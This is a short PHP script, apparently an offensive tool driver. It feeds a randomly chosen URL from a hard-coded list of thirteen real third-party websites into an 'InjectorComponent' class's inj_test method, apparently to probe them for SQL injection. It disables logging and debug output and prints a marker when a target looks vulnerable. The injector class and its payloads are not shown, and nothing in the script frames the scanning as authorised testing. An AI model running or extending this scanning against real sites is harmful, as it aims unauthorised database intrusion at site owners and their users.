<?php


ignore_user_abort(1); 
$mysql = new InjectorComponent();
$u[] = 'www.bachverband.de/index.php?pcid=1&pdid=16';
$u[] = 'molecularcloning.com/index.php?prt=199';
$u[] = 'www.djpatricksterk.nl/index.php?page=home&show=23';
$u[] = 'www.eloteto.hu/portal/index2.php?category=50&showcontent=2';
$u[] = 'www.groepengroningen.nl/online/details.php?id=6';
$u[] = 'accessauto.co.za/details.php?stocknr=audiallroad';
$u[] = 'www.pregnancy-baby-care.com/list_related_contents.php?q=1679&rel=category';
$u[] = 'www.oneclickhomevideos.com/members/perf-videos.php?id=11';
$u[] = 'pifexplosion.com/splashpage2.php?ref=sunrise';
$u[] = 'www.newreleasetoday.com/artistdetail.php?artist_id=1098';
$u[] = 'www.selectsmart.com/plus/select.php?url=conflictanimal';
$u[] = 'tools.bardiauto.ro/details.php?kod=TLCB1015';
$u[] = 'news.vegan.com/pages/article.php?id=1397';



$rrr= mt_rand(0,sizeof($u)-1);




//$u = 'hdleecher.com/?s=fs';
//$test = $mysql->inj_test($u);
$mysql->log_enable=false;
$mysql->debug =false;
$mysql->debug_full_content=false; //ну прям ваще полный с выводом удаленной страницы.
$mysql->debug_proxy=false;



$test = $mysql->inj_test($u[$rrr]);
if($test !=false){
	echo '||URLURL|| ololo';
	
}
die;

///логирование
//print_r($_SERVER);
//print_r($mysql);